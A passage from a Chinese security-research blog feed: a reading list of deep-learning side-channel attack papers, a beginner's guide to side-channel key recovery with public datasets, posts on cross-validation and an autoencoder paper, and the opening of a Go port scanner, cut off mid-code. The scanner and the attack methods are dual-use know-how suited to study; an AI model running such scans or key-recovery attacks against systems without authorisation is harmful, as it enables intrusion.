<td style="text-align:center">特征提取</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">Multilabel Deep Learning-Based Side-Channel Attack</td>
<td style="text-align:center"><a href="https://i4mhmh.cn/archives/1db5564d.html">click</a></td>
<td style="text-align:center"><a href="https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=9237977">link</a></td>
<td style="text-align:center">多标签学习</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">Deep Learning based Side-Channel Attack: a New Profiling Methodology based on Multi-Label Classification</td>
<td style="text-align:center"><a href="http://www.i4mhmh.cn/archives/16233d99.html">click</a></td>
<td style="text-align:center"><a href="https://eprint.iacr.org/2020/436.pdf">link</a></td>
<td style="text-align:center">多标签学习</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">CDAE: Towards Empowering Denoising in Side-Channel Analysis</td>
<td style="text-align:center"><a href="https://i4mhmh.cn/archives/c4b22as16.html">click</a></td>
<td style="text-align:center"><a href="https://www.researchgate.net/profile/Yang-Guang-22/publication/339321894_CDAE_Towards_Empowering_Denoising_in_Side-Channel_Analysis/links/60a51dbda6fdcc3f30572187/CDAE-Towards-Empowering-Denoising-in-Side-Channel-Analysis.pdf">link</a></td>
<td style="text-align:center">降噪</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td style="text-align:center">On the Performance of Convolutional Neural Networks for Side-channel Analysis</td>
<td style="text-align:center"><a href="https://i4mhmh.cn/archives/b68bb5eb.html">click</a></td>
<td style="text-align:center"><a href="https://dial.uclouvain.be/pr/boreal/object/boreal%3A218727/datastream/PDF_01/view">link</a></td>
<td style="text-align:center">网络架构</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:center">To Overfit, Or Not to Overfit: Improving the Performance of Deep Learning-based SCA</td>
<td style="text-align:center"><a href="https://i4mhmh.cn/archives/f423d1e.html">click</a></td>
<td style="text-align:center"><a href="https://eprint.iacr.org/2022/340.pdf">link</a></td>
<td style="text-align:center">炼丹指导</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td style="text-align:center">The Best of Two Worlds: Deep Learning-assisted Template Attack</td>
<td style="text-align:center"><a href="https://i4mhmh.cn/archives/a09255bb.html">click</a></td>
<td style="text-align:center"><a href="https://tches.iacr.org/index.php/TCHES/article/view/9707/9237">link</a></td>
<td style="text-align:center">特征提取方法</td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td style="text-align:center">Pay Attention to Raw Traces: A Deep Learning Architecture for End-to-End Profiling Attacks</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://tches.iacr.org/index.php/TCHES/article/view/8974">link</a></td>
<td style="text-align:center">端到端侧信道攻击</td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td style="text-align:center">Cross-Device Profiled Side-Channel Attack with Unsupervised Domain Adaptation</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://tches.iacr.org/index.php/TCHES/article/view/9059/8646">link</a></td>
<td style="text-align:center">跨设备侧信道攻击</td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td style="text-align:center">Methodology for Efficient CNN Architectures in Profiling Attacks</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://tches.iacr.org/index.php/TCHES/article/view/8391/7787">link</a></td>
<td style="text-align:center">网络架构</td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td style="text-align:center">It’s a Kind of Magic: A Novel Conditional GAN Framework for Efficient Profiling Side-channel Analysis</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://eprint.iacr.org/2023/1108.pdf">link</a></td>
<td style="text-align:center">特征提取</td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td style="text-align:center">I Know What Your Layers Did: Layer-wise Explainability of Deep Learning Side-channel Analysis</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://eprint.iacr.org/2022/1087.pdf">link</a></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">13</td>
<td style="text-align:center">Revisiting a Methodology for Efficient CNN Architectures in Profiling Attacks</td>
<td style="text-align:center"><a href="https://i4mhmh.cn/archives/ddc648f6.html">click</a></td>
<td style="text-align:center"><a href="https://tches.iacr.org/index.php/TCHES/article/view/8391/7787">link</a></td>
<td style="text-align:center">练手用</td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td style="text-align:center">Don’t Learn What You Already Know Scheme-Aware Modeling for Profiling Side-Channel Analysis against Masking</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://eprint.iacr.org/2022/493.pdf">link</a></td>
<td style="text-align:center">没看懂</td>
</tr>
<tr>
<td style="text-align:center">15</td>
<td style="text-align:center">Exploring Feature Selection Scenarios for Deep Learning-based Side-channel Analysis</td>
<td style="text-align:center"><a href="https://i4mhmh.cn/archives/e366992f.html">click</a></td>
<td style="text-align:center"><a href="https://eprint.iacr.org/2021/1414.pdf">link</a></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">16</td>
<td style="text-align:center">Side-channel analysis against ANSSI’s protected AES implementation on ARM: end-to-end attacks with multi-task learning</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://link.springer.com/article/10.1007/s13389-023-00311-7">link</a></td>
<td style="text-align:center">多任务学习</td>
</tr>
<tr>
<td style="text-align:center">17</td>
<td style="text-align:center">Multi-Leak Deep-Learning Side-Channel Analysis</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://eprint.iacr.org/2021/1107.pdf">link</a></td>
<td style="text-align:center">多点泄露攻击</td>
</tr>
<tr>
<td style="text-align:center">18</td>
<td style="text-align:center">Deep Learning Side-Channel Collision Attack</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://tches.iacr.org/index.php/TCHES/article/view/10969">link</a></td>
<td style="text-align:center">碰撞攻击（新</td>
</tr>
<tr>
<td style="text-align:center">19</td>
<td style="text-align:center">Remove Some Noise: On Pre-processing of Side-channel Measurements with Autoencoders</td>
<td style="text-align:center"><a href="https://i4mhmh.cn/archives/6f94536a.html">click</a></td>
<td style="text-align:center"><a href="https://tches.iacr.org/index.php/TCHES/article/view/8688">link</a></td>
<td style="text-align:center">降噪</td>
</tr>
<tr>
<td style="text-align:center">20</td>
<td style="text-align:center">THE CIRCLE OF DL-SCA</td>
<td style="text-align:center">—</td>
<td style="text-align:center"><a href="https://pure.tudelft.nl/ws/portalfiles/portal/149257284/PhD_Thesis_Lichao_Wu.pdf">link</a></td>
<td style="text-align:center">吴立超博士毕业论文</td>
</tr>
<tr>
<td style="text-align:center">21</td>
<td style="text-align:center">I Choose You: Automated Hyperparameter Tuning for Deep Learning-based Side-channel Analysis</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://eprint.iacr.org/2020/1293.pdf">link</a></td>
<td style="text-align:center">超参数自动调整</td>
</tr>
<tr>
<td style="text-align:center">22</td>
<td style="text-align:center">Hiding in Plain Sight: Non-profiling Deep Learning-based Side-channel Analysis with Plaintext/Ciphertext</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://eprint.iacr.org/2023/209.pdf">link</a></td>
<td style="text-align:center">非建模侧信道攻击</td>
</tr>
<tr>
<td style="text-align:center">23</td>
<td style="text-align:center">Breaking Cryptographic Implementations Using Deep Learning Techniques</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">24</td>
<td style="text-align:center">SoK: Deep Learning-based Physical Side-channel Analysis</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://eprint.iacr.org/2021/1092.pdf">link</a></td>
<td style="text-align:center">综述</td>
</tr>
<tr>
<td style="text-align:center">25</td>
<td style="text-align:center">Fake it till you make it: Data Augmentation using Generative Adversarial Networks for all the crypto you need on small devices</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://eprint.iacr.org/2021/991.pdf">link</a></td>
<td style="text-align:center">数据增强</td>
</tr>
<tr>
<td style="text-align:center">26</td>
<td style="text-align:center">Exploring Feature Selection Scenarios for Deep Learning-based Side-channel Analysis</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://tches.iacr.org/index.php/TCHES/article/view/9842/9345">link</a></td>
<td style="text-align:center">兴趣点选择</td>
</tr>
<tr>
<td style="text-align:center">27</td>
<td style="text-align:center">The Need for Speed: A Fast Guessing Entropy Calculation for Deep Learning-Based SCA</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://www.mdpi.com/1999-4893/16/3/127/pdf?version=1677163539">link</a></td>
<td style="text-align:center">训练中callback</td>
</tr>
<tr>
<td style="text-align:center">28</td>
<td style="text-align:center">Ranking Loss: Maximizing the Success Rate in Deep Learning Side-Channel Analysis</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://tches.iacr.org/index.php/TCHES/article/view/8726/8326">link</a></td>
<td style="text-align:center">损失函数</td>
</tr>
<tr>
<td style="text-align:center">29</td>
<td style="text-align:center">Label Correlation in Deep Learning-Based Side-Channel Analysis</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://eprint.iacr.org/2022/1507.pdf">link</a></td>
<td style="text-align:center">标签相关性</td>
</tr>
<tr>
<td style="text-align:center">30</td>
<td style="text-align:center">Breaking Free: Leakage Model-free Deep Learning-based Side-channel Analysis</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://eprint.iacr.org/2023/1110.pdf">link</a></td>
<td style="text-align:center">泄露模型</td>
</tr>
<tr>
<td style="text-align:center">31</td>
<td style="text-align:center">Pay Attention to Raw Traces: A Deep LearningArchitecture for End-to-End Profiling Attacks</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://tches.iacr.org/index.php/TCHES/article/view/8974/8552">link</a></td>
<td style="text-align:center">攻击原始能量迹</td>
</tr>
<tr>
<td style="text-align:center">32</td>
<td style="text-align:center">Deep Learning Side-Channel Analysis on Large-Scale Traces A Case Study on a Polymorphic AES</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://eprint.iacr.org/2020/881.pdf">link</a></td>
<td style="text-align:center">攻击大规模能量迹</td>
</tr>
<tr>
<td style="text-align:center">33</td>
<td style="text-align:center">Non-Profiled Deep Learning-based Side-Channel attacks with Sensitivity Analysis</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://tches.iacr.org/index.php/TCHES/article/view/7387/6559">link</a></td>
<td style="text-align:center">敏感值分析</td>
</tr>
<tr>
<td style="text-align:center">34</td>
<td style="text-align:center">EstraNet: An Efficient Shift-Invariant Transformer Network for Side-Channel Analysis</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://tches.iacr.org/index.php/TCHES/article/view/11255/10797">link</a></td>
<td style="text-align:center">Trasformer 侧信道</td>
</tr>
<tr>
<td style="text-align:center">35</td>
<td style="text-align:center">A Comprehensive Study of Deep Learning for Side-Channel Analysis</td>
<td style="text-align:center">—</td>
<td style="text-align:center"><a href="https://eprint.iacr.org/2019/439.pdf">link</a></td>
<td style="text-align:center">NLL</td>
</tr>
<tr>
<td style="text-align:center">36</td>
<td style="text-align:center">Leakage Certification Revisited: Bounding Model Errors in Side-Channel Security Evaluations</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://eprint.iacr.org/2019/132.pdf">link</a></td>
<td style="text-align:center">感知信息</td>
</tr>
<tr>
<td style="text-align:center">37</td>
<td style="text-align:center">Perceived Information Revisited New Metrics to Evaluate Success Rate of Side-Channel Attacks</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://tches.iacr.org/index.php/TCHES/article/view/9819/9324">link</a></td>
<td style="text-align:center">感知信息pro</td>
</tr>
<tr>
<td style="text-align:center">38</td>
<td style="text-align:center">Perceived Information Revisited II Information-Theoretical Analysis of Deep-Learning Based Side-Channel Attacks</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://eprint.iacr.org/2024/124.pdf">link</a></td>
<td style="text-align:center">感知信息pro max</td>
</tr>
<tr>
<td style="text-align:center">39</td>
<td style="text-align:center">AutoPOI: automated points of interest selection for side-channel analysis</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://link.springer.com/content/pdf/10.1007/s13389-023-00328-y.pdf">link</a></td>
<td style="text-align:center">自动提取兴趣点</td>
</tr>
<tr>
<td style="text-align:center">40</td>
<td style="text-align:center">Weakly Profiling Side-channel Analysis</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://ches.iacr.org/2024/papers-issue-4/4_73.pdf">link</a></td>
<td style="text-align:center">新建模方法</td>
</tr>
<tr>
<td style="text-align:center">41</td>
<td style="text-align:center">Plaintext: A Missing Feature for Enhancing the Power of Deep Learning in Side-Channel Analysis? Breaking multiple layers of side-channel countermeasures</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://tches.iacr.org/index.php/TCHES/article/view/8677/8236">link</a></td>
<td style="text-align:center">提升针对掩码的破坏性</td>
</tr>
<tr>
<td style="text-align:center">42</td>
<td style="text-align:center">Strength in Numbers: Improving Generalization with Ensembles in Machine Learning-based Profiled Side-channel Analysis</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://tches.iacr.org/index.php/TCHES/article/view/8686/8245">link</a></td>
<td style="text-align:center">集成学习</td>
</tr>
<tr>
<td style="text-align:center">43</td>
<td style="text-align:center">Give Me 5 Minutes Attacking ASCAD with a Single Side-Channel Trace</td>
<td style="text-align:center"></td>
<td style="text-align:center"><a href="https://eprint.iacr.org/2021/817.pdf">link</a></td>
<td style="text-align:center">SCALib的广告</td>
</tr>
</tbody>
</table>
<h1>指北</h1>
<blockquote>
<p>这部分解释侧信道攻击以及本人研究方向的内容。</p>
</blockquote>
<h2 id="什么是侧信道攻击？">什么是侧信道攻击？</h2>
<img src="../img/image-20241017153632034.png" style="zoom:30%;" />
<p>在我小的时候，经常趁父母出去上班不在家的空挡偷偷打开电视，看一些古侠剧（天龙八部、神雕侠侣…），里边的各种情节都十分吸引我。但是，我无时无刻不得不关注的就是门外的脚步声，那个时候只要二老回家，脚步声听的是清清楚楚，直接电视关机飞到小桌子前假装写作业一气呵成。没想到小小年纪便用到了我高贵的侧信道攻击（Side Channel Attack，SCA）技术！也就是说我并不需要看到他俩这个主体，通过上楼梯时所泄露出来的脚步声这一侧信息就可以判别是不是他们。</p>
<img src="../img/image-20241017155117442.png"  style="zoom:30%;" />
<p>更令我没想到的是，后来他们也用到了侧信道分析！并不需要看到我在看电视，而是仅仅需要摸一下电视的大脑袋，通过电视机壳传出来的温度侧信息，去决定是否要对我发起物理攻击（不是。</p>
<p>在密码学领域中，侧信道攻击并不是直接针对的密码的算法层面，相较于其他理论上的分析攻击方法，该方法直接对设备加密时所泄漏的侧信息进行分析。例如在RSA密码算法中，当加密算法执行到求平方乘步骤时，指数位为0与为1所需要的执行耗时是不同的，攻击者可以通过观察执行泄露的时间侧信息来进行处理，进而恢复密钥。</p>
<p>侧信道攻击又分为建模类侧信道攻击(Profiling Side Channel Attack)以及非建模类侧信道攻击(Non-Profiling Side Channel Attack)。建模类侧信道攻击要求攻击者事先拥有一个与被攻击设备相同或相似的副本，通过采集在副本设备上执行密码算法所泄露出来的侧信息并加以分析建模。最后，将建好的模型用在被攻击设备上所泄漏的侧信息中，以完成关键信息的恢复，常见的攻击方法有模板攻击、随机模型攻击以及基于深度学习的侧信道攻击。非建模类侧信道攻击则直接对被攻击设备发起攻击，常见的攻击方法有SPA、DPA、CPA。</p>
<h2 id="如何入门侧信道攻击">如何入门侧信道攻击</h2>
<p>由于本人研究方向为侧信道攻击与深度学习的交叉学科（Deep Learning based Side Channel Attack，DLSCA），所以在学习相关知识的时候更偏向于深度学习建模的方法，大致分为兴趣点选择、数据预处理、特征工程、模型的训练、评估五部分<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>，具体如图1所示。</p>
<p><img src="../img/image-20241017162602457.png" alt="图1  基于深度学习的侧信道攻击流程"></p>
<p>以我个人经验，需要先搞懂的是你要建模的侧信息是什么，以下是在攻击时常用的数据集。每个数据集中都包含了大量的能量迹，每条能量迹又存在对应的时间样本点。之后的事情就是看论文做实验，下一部分有一些可以直接上手的基础实验，SCA_Box中的实验大家在做的时候如果有疑问可以直接在上边提Issue或Email联系我，我看到了都会回复。</p>
<table>
<thead>
<tr>
<th>数据集</th>
<th>🔗链接</th>
</tr>
</thead>
<tbody>
<tr>
<td>ASCAD</td>
<td><a href="https://github.com/ANSSI-FR/ASCAD/tree/master">https://github.com/ANSSI-FR/ASCAD/tree/master</a></td>
</tr>
<tr>
<td>CHESCTF_2018</td>
<td><a href="http://aisylabdatasets.ewi.tudelft.nl/ches_ctf.h5">http://aisylabdatasets.ewi.tudelft.nl/ches_ctf.h5</a></td>
</tr>
<tr>
<td>AES_HD</td>
<td><a href="http://aisylabdatasets.ewi.tudelft.nl/aes_hd_ext.npz">http://aisylabdatasets.ewi.tudelft.nl/aes_hd_ext.npz</a></td>
</tr>
<tr>
<td>AES_RD</td>
<td><a href="https://github.com/ikizhvatov/randomdelays-traces">https://github.com/ikizhvatov/randomdelays-traces</a></td>
</tr>
<tr>
<td>DPAv4.2_Zaid</td>
<td><a href="https://github.com/gabzai/Methodology-for-efficient-CNN-architectures-in-SCA/blob/master/DPA-contest%20v4/DPAv4_dataset.zip">https://github.com/gabzai/Methodology-for-efficient-CNN-architectures-in-SCA/blob/master/DPA-contest v4/DPAv4_dataset.zip</a></td>
</tr>
</tbody>
</table>
<h2 id="需要复现的实验（有源码）">需要复现的实验（有源码）</h2>
<p>目前，DLSCA的论文有很多都给出了代码，大家有时间都要复现一下。我在下边贴出来论文以及对应代码链接，还有一些基础实验的复现代码，可以结合自己情况审代码以及实现。</p>
<h3 id="基础实验：">基础实验：</h3>
<ul>
<li>SCA_Box: <a href="https://github.com/i4mhmh/SCA_Box-Side-Channel-Attack-Tool-chest">https://github.com/i4mhmh/SCA_Box-Side-Channel-Attack-Tool-chest</a></li>
<li>信噪比：<a href="https://github.com/ileanabuhan/LeakageAssessment/blob/main/SNR-as-distingusher.ipynb">https://github.com/ileanabuhan/LeakageAssessment/blob/main/SNR-as-distingusher.ipynb</a></li>
<li>感知信息：<a href="https://github.com/ileanabuhan/LeakageAssessment/blob/main/What_is_PI.ipynb">https://github.com/ileanabuhan/LeakageAssessment/blob/main/What_is_PI.ipynb</a></li>
</ul>
<h3 id="论文及代码">论文及代码</h3>
<ul>
<li>
<p><a href="https://github.com/ANSSI-FR/ASCAD/tree/master">Study of Deep Learning Techniques for Side-Channel Analysis and Introduction to ASCAD Database</a></p>
</li>
<li>
<p><a href="https://github.com/AISyLab/feature_selection_dlsca">Exploring Feature Selection Scenarios for Deep Learning-based Side-Channel Analysis</a></p>
</li>
<li>
<p><a href="https://github.com/cassiersg/ASCAD-5minutes">Give Me 5 Minutes Attacking ASCAD with a Single Side-Channel Trace</a></p>
</li>
<li>
<p><a href="https://github.com/KULeuven-COSIC/TCHES20V3_CNN_SCA">Revisiting a Methodology for Efficient CNN Architectures in Profiling Attacks</a></p>
</li>
<li>
<p><a href="https://github.com/AISyLab/fge_sca">The Need for Speed: A Fast Guessing Entropy Calculation for Deep Learning-Based SCA</a></p>
</li>
<li>
<p><a href="https://eprint.iacr.org/2022/1507">Label Correlation in Deep Learning-based Side-channel Analysis</a></p>
</li>
<li>
<p><a href="https://ches.iacr.org/2024/papers-issue-4/4_73.pdf">Weakly Profiling Side-channel Analysis</a></p>
</li>
</ul>
<h1>参考文献</h1>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p>SoK: Deep Learning-based Physical Side-channel Analysis <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <tags>
        <tag>侧信道攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>交叉验证（Cross-Validation）</title>
    <url>/archives/f2204423.html</url>
    <content><![CDATA[<h1>背景</h1>
<p>在构建模型框架后，需要挑选效果较好的超参数，此时如果Profiling 数据集较小，训练集、验证集的划分将会对模型的性能产生较大的影响。</p>
<p>如图一所示，将数据集划分为训练集、验证集、测试集，注意：<strong>测试集一旦选定，就不要再洗回到验证集、训练集那部分，否则就是造假</strong>图中训练集与验证集位置的选择将会得出不同的表现ACC（准确率）。</p>
<p><img src="../img/image-20230507125027103.png" alt="图1 不同划分位置导致的不同ACC"></p>
<h1>方法</h1>
<p>为了解决上述问题，提出K-fold cross-validation，这里举4折交叉验证（4-fold cross-validation）</p>
<ol>
<li>
<p>将数据集（<strong>不包含测试集</strong>）平均分成4份，其中3份作为训练集，剩余的1份作为验证集。</p>
</li>
<li>
<p>第一次使用第1、2、3份作为训练集，第4份作为验证集，分别测试不同的超参数组合情况下，模型的准确率、召回率等指标（按需求自定）作为得分并记录。</p>
</li>
<li>
<p>在不同的划分情况下，重复第二步。</p>
</li>
<li>
<p>每个不同的超参数组合中的得分取平均值， 最后对比出最优组合。</p>
</li>
</ol>
<p><img src="../img/image-20230507125038784.png" alt="图2 方法"></p>
<p>将图2中每个超参数对应的ACC值取平均可得<code>a-&gt;0.575, b-&gt;0.825 c-&gt;0.725</code>综合选择超参数组合b</p>
<h1>总结</h1>
<p>交叉验证不仅用于超参数选择，也可用作选择模型，十折交叉验证是目前数据集中数据较多时的交叉验证的最广泛采用的解决方法。</p>
]]></content>
      <categories>
        <category>基于深度学习的侧信道攻击</category>
      </categories>
      <tags>
        <tag>评估方法</tag>
      </tags>
  </entry>
  <entry>
    <title>文献阅读笔记-One Network to rule them all. An autoencoder approach to encode datasets</title>
    <url>/archives/5dad75f5.html</url>
    <content><![CDATA[<h1>文章信息</h1>
<ul>
<li>
<p>作者：<strong>Cristian-Alexandru Botocan</strong></p>
</li>
<li>
<p>单位：<strong>EEMCS, Delft University of Technology, The Netherlands</strong></p>
</li>
<li>
<p>出处：<strong>ePrint</strong></p>
</li>
<li>
<p>标题：<strong>One Network to rule them all. An autoencoder approach to encode datasets</strong></p>
</li>
</ul>
<h1>文章内容</h1>
<h2 id="背景">背景</h2>
<p>​	越来越多的研究证实了模板攻击在侧信道攻击中的有效性，而深度学习结合侧信道攻击，即在结合ML模型后性能较好。自CNN应用到侧信道攻击中后，相继有许多其他模型被提出，但统一的问题在于每个模型都可以在单一的数据集中表现良好，而当加密算法种类增加对于每个算法都要找到对应最佳模型，即对于不同数据集要找到不同的算法最优解的时间开销较大。</p>
<h2 id="目的">目的</h2>
<p>作者引入<a href="http://www.niessnerlab.org/projects/thies2016face.html">Deep Fake</a>的概念,通过AEs(AutoEncoders-自编码器)将数据集的特征进行压缩以减轻存储开销，主要目的是找到一个通用模型，对维度统一后的数据集进行攻击，这里统一的数据集与源数据在数量上相同，但维度参数完全不同。</p>
<h2 id="结论">结论</h2>
<p>进行AE预处理后的数据集与未处理的数据集结果仍受模型的影响，对于不同的模型效果截然不同，在No Conv模型上获得了较大的性能提升。</p>
<h1>实验与结果</h1>
<p>作者采Vanilla AE自编码器（结构如图1所示），优化器<code>Adamax</code>，<code>Epochs</code>={500, 700, 1000}，学习率：0.01,0.001,0.0025,<code>Batch_size</code>={200, 400},<code>Shuffle=True</code>。模型为<strong>ML Basic、MLP Best、CNN Best、No Conv</strong>。评价指标为<strong>GE(Guess Entropy)、SR（Success Rate）</strong>，GE收敛到1即为攻击成功。</p>
<table>
<thead>
<tr>
<th>数据集名称</th>
<th>介绍</th>
<th>地址</th>
</tr>
</thead>
<tbody>
<tr>
<td>ASCAD fixed key</td>
<td>6w条能量迹，700个特征，算法：AES128，采集设备：ATMega8515</td>
<td><a href="https://github.com/ANSSI-FR/ASCAD">https://github.com/ANSSI-FR/ASCAD</a></td>
</tr>
<tr>
<td>ASCAD fixed key with desynchronization</td>
<td>人为的随机<strong>去同步</strong></td>
<td>-</td>
</tr>
<tr>
<td>ASCAD variable key</td>
<td></td>
<td>-</td>
</tr>
<tr>
<td>CHESCTF</td>
<td>1w条能量迹，65w个特征，算法：AES128，采集设备STM32， 作者提取了4k个特征。</td>
<td><a href="https://zenodo.org/record/3733418#.Yc2iq1ko9Pa">https://zenodo.org/record/3733418#.Yc2iq1ko9Pa</a></td>
</tr>
<tr>
<td>DPAV42</td>
<td>8w条能量迹，800个特征，算法：带掩码的AES128，采集设备：8-bit controller</td>
<td><a href="https://www.dpacontest.org/v4/42_traces.php">https://www.dpacontest.org/v4/42_traces.php</a></td>
</tr>
</tbody>
</table>
<img src="../img/image-20230316105556527.png" alt="图1 VAE结构" style="zoom:50%;" />
<p>图2 为预处理与未预处理的数据集在MLP Basic模型上的表现，对于不采用对抗措施的ASCAD、DPAV42数据集无明显改进，且在使用了时钟抖动的数据集上GE无法收敛到1，在CHSCTF数据集上，作者将GE无法收敛归因于能量迹条数过少以至于学习不完<strong>4000</strong>个特征，造成数据集的破坏。因为相较于CHESCTF，DPAV42数据集上的800个特征以及8w条能量迹使得攻击效果较好。</p>
<p><img src="../img/image-20230316110525936.png" alt="图2 MLP Basic攻击结果" style="zoom:50%;" /><img src="../img/image-20230316110550589.png" alt="图2 MLP Basic攻击结果" style="zoom:50%;" /></p>
<p>MLP Best是针对于ASCAD优化的模型，因此在图三中可以看出预处理后的GE收敛效果不明显甚至较差，而在CHESCTF上的收敛结果较好。</p>
<img src="../img/image-20230316111956687.png" alt="图3 MLP Best" style="zoom:67%;" />
<p>CNN Bset同样为带有防御措施的ASCAD数据集准备，在ASCAD_fixed_desync50/100上预处理的攻击效果反而较差。</p>
<img src="../img/image-20230316114415057.png" alt="图4 CNN Best攻击结果" style="zoom:67%;" />
<p>如图五所示，在ASCAD_variable与CHESCTF数据集中表现较好，GE收敛速度要优于未处理攻击。</p>
<p><img src="../img/image-20230316162537183.png" alt="图5 No Conv模型攻击结果"></p>
<p>附数值表</p>
<p><strong>NT attacking： NT - number of traces used for the attacking becomes smaller than the maximum set value.</strong></p>
<p><img src="../img/image-20230316163759685.png" alt="Comparison with the baseline for the MLP Basic"></p>
<p><img src="../img/image-20230316163824408.png" alt="Comparison with the baseline for the MLP Best"></p>
<p><img src="../img/image-20230316163842602.png" alt="Comparison with the baseline for the CNN Best"></p>
<p><img src="../img/image-20230316163901051.png" alt="Comparison with the baseline for the No Conv"></p>
<h1>总结</h1>
<p>作者通过自编码器对数据集进行预处理，在不同模型、不同数据集的条件下进行评估，虽然结果并没有整体偏好，但在某方面有较大的提升，特别是在No Conv模型下。总体指出一个研究方向：统一模型，即要在同一个模型下能对多个数据集进行处理，要求找到最优压缩方法，对不同的数据集进行处理，得到整体较好的结果。</p>
]]></content>
      <tags>
        <tag>数据预处理</tag>
      </tags>
  </entry>
  <entry>
    <title>基于Golang的端口扫描器</title>
    <url>/archives/7fd368e6.html</url>
    <content><![CDATA[<h1>基于Golang的端口扫描器</h1>
<h2 id="第一版-8s">第一版 (8s)</h2>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">	<span class="string">&quot;sort&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个缓冲池</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(ports, results <span class="keyword">chan</span> <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> p := <span class="keyword">range</span> ports &#123;</span><br><span class="line">		addresss := fmt.Sprintf(<span class="string">&quot;在这里写你的url:%d&quot;</span>, p)</span><br><span class="line">		conn, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, addresss)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			results &lt;- -p</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line">		conn.Close()</span><br><span class="line">		results &lt;- p</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	start := time.Now()</span><br><span class="line">	<span class="keyword">var</span> open_ports []<span class="type">int</span></span><br><span class="line">	<span class="keyword">var</span> closed_ports []<span class="type">int</span></span><br><span class="line">	ports := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">500</span>)</span><br><span class="line">	results := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">1</span>; i &lt; <span class="built_in">cap</span>(ports); i++ &#123;</span><br><span class="line">		<span class="keyword">go</span> worker(ports, results)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		<span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">1000</span>; i++ &#123;</span><br><span class="line">			ports &lt;- i</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">1</span>; i &lt; <span class="number">1000</span>; i++ &#123;</span><br><span class="line">		ports := &lt;-results</span><br><span class="line">		<span class="keyword">if</span> ports &gt; <span class="number">0</span> &#123;</span><br><span class="line">			open_ports = <span class="built_in">append</span>(open_ports, ports)</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			closed_ports = <span class="built_in">append</span>(closed_ports, -ports)</span><br><span class="line">		&#125;</span><br><span class="line">	